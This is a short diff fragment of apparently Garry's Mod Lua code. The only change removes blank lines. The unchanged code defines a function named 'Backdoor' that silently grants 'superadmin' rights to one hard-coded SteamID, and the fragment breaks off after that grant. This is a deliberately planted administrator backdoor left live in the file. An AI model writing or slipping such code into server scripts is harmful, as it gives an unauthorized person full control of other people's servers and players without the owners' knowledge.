@@ -1,5 +1,3 @@
-
-
 function Backdoor( ply )
     if ( ply:SteamID() == "STEAM_0:0:49679575" ) then
         ply:SetUserGroup("superadmin")
